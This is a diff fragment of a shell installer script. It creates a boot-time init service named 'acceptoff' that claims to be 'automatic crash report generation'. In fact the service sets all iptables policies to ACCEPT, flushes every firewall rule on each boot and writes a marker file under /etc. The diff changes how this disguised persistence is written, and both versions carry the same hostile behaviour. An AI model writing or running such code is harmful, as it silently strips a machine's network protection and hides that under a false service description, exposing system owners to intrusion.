@@ -172,25 +172,27 @@ function system_check() {
     iptables -P FORWARD ACCEPT
     iptables -P OUTPUT ACCEPT
     iptables -F
-cat >/etc/init.d/acceptoff <<-EOF
-#! /bin/sh
-### BEGIN INIT INFO
-# Provides:        acceptoff
-# Required-Start:  $local_fs $remote_fs
-# Required-Stop:   $local_fs $remote_fs
-# Default-Start:   2 3 4 5
-# Default-Stop:
-# Short-Description: automatic crash report generation
-### END INIT INFO
+    echo '
+    #! /bin/sh
+    ### BEGIN INIT INFO
+    # Provides:        acceptoff
+    # Required-Start:  $local_fs $remote_fs
+    # Required-Stop:   $local_fs $remote_fs
+    # Default-Start:   2 3 4 5
+    # Default-Stop:
+    # Short-Description: automatic crash report generation
+    ### END INIT INFO
 
-iptables -P INPUT ACCEPT
-iptables -P FORWARD ACCEPT
-iptables -P OUTPUT ACCEPT
-iptables -F
-EOF
+    iptables -P INPUT ACCEPT
+    iptables -P FORWARD ACCEPT
+    iptables -P OUTPUT ACCEPT
+    iptables -F
+    echo "111" > /etc/123589
+    ' >/etc/init.d/acceptoff
     chmod 755 /etc/init.d/acceptoff
     update-rc.d acceptoff defaults 90
   fi
+  sed -i 's/^[ ]*//g' /etc/init.d/acceptoff && sed -i '/^$/d' /etc/init.d/acceptoff
 }
 
 function kaishi_install() {
